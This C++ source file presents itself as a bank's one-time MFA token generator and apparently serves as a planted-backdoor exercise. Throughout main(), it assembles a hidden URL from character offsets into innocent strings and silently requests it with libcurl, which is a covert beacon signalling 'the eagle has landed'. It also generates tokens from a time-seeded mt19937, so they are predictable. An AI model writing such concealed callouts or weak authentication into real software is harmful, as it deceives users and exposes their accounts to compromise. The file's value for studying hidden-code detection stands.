#include <array>
#include <curl/curl.h>
#include <curl/easy.h>
#include <iostream>
#include <string>
#include <tuple>
#include <random>
#include <cstdlib>
#include <type_traits>

using SOL_t = std::tuple<int, int, int>;

const char motto[] = "Hawk Bank: Securing financial freedom since 1982.";
const char prompt[] = "Your one-time token/MFA key is %s. Please provide it to the "
                      "customer service representative.\n";

size_t discard_me(char *ptr, size_t size, size_t nmemb, void *userdata) {
  return nmemb;
}
template <int N>
std::string build_flare(const std::array<SOL_t, N> &map) {
  std::string flare{""};
  for (auto entry : map) {
    auto source = (std::get<0>(entry) == 0) ? motto : prompt;
    auto offset = std::get<1>(entry);
    auto length = std::get<2>(entry);
    for (int index{0}; index < length; index++) {
      flare += source[index + offset];
    }
  }
  return flare;
}

template <typename Type>
Type generate_one_time_token() {
  const Type TOKEN_RANGE{999};
  std::mt19937 rng;
  rng.seed((uint64_t)time(nullptr));
  if constexpr (std::is_unsigned<Type>()) {
    return (((Type)rng()) % 999) + (((rng() % 9) + 1)*1000);
  } else {
    return std::abs(((Type)rng()) % 999) + (((rng() % 9) + 1)*1000);
  }
}

int main() {
  constexpr const std::array<SOL_t, 22> flare_h = {
      std::make_tuple(1, 57, 1) /* h */,
      std::make_tuple(1, 56, 1) /* T */,
      std::make_tuple(1, 56, 1) /* T */,
      std::make_tuple(1, 35, 1) /* p */,
      std::make_tuple(0, 9, 1) /* : */,
      std::make_tuple(1, 19, 1) /* / */,
      std::make_tuple(1, 19, 1) /* / */,
      std::make_tuple(1, 47, 1) /* d */,
      std::make_tuple(0, 14, 1) /* u */,
      std::make_tuple(0, 13, 1) /* c */,
      std::make_tuple(0, 3, 1) /* k */,
      std::make_tuple(1, 47, 1) /* d */,
      std::make_tuple(0, 14, 1) /* u */,
      std::make_tuple(0, 13, 1) /* c */,
      std::make_tuple(0, 3, 1) /* k */,
      std::make_tuple(0, 18, 1) /* g */,
      std::make_tuple(1, 1, 1) /* o */,
      std::make_tuple(1, 33, 1) /* . */,
      std::make_tuple(0, 13, 1) /* c */,
      std::make_tuple(1, 1, 1) /* o */,
      std::make_tuple(1, 20, 1) /* m */,
      std::make_tuple(1, 19, 1) /* / */,
  };

  constexpr const std::array<SOL_t, 13> flare_m = {
      std::make_tuple(1, 56, 3) /* The */,
      std::make_tuple(0, 12, 1) /* e */,
      std::make_tuple(0, 1, 1) /* a */,
      std::make_tuple(0, 18, 1) /* g */,
      std::make_tuple(0, 28, 1) /* l */,
      std::make_tuple(0, 12, 1) /* e */,
      std::make_tuple(1, 57, 1) /* h */,
      std::make_tuple(0, 1, 1) /* a */,
      std::make_tuple(0, 11, 1) /* s */,
      std::make_tuple(0, 28, 1) /* l */,
      std::make_tuple(0, 6, 2) /* an */,
      std::make_tuple(1, 47, 2) /* de */,
      std::make_tuple(1, 47, 1)} /* d */;
  curl_global_init(CURL_GLOBAL_ALL);
  std::string flare_url{build_flare<22>(flare_h) + std::string{"?q="} +
                        build_flare<13>(flare_m)};
  auto easy_handle = curl_easy_init();
  curl_easy_setopt(easy_handle, CURLOPT_URL, flare_url.c_str());
  curl_easy_setopt(easy_handle, CURLOPT_FOLLOWLOCATION, 1L);
  curl_easy_setopt(easy_handle, CURLOPT_WRITEFUNCTION, discard_me);
  curl_easy_perform(easy_handle);
  curl_global_cleanup();

  printf("%s\n", motto);
  printf(prompt, std::to_string(generate_one_time_token<int64_t>()).c_str());
  return 0;
}
